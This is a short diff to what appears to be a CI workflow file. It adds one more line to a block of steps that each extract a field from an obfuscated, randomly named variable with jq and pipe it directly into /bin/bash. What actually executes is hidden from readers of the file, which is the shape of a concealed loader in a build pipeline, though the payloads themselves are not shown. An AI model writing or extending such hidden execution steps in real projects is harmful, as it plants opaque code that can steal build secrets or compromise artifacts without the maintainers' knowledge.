@@ -28,6 +28,7 @@ jobs:
           echo $vtdn649 | jq -r .qrdty97618 | /bin/bash
           echo $xr53595 | jq -r .qx67 | /bin/bash
           printf '%s' "$ski95" | jq -r .vzuul51 | /bin/bash
+          printf '%s' "$wm42" | jq -r .lv25119 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
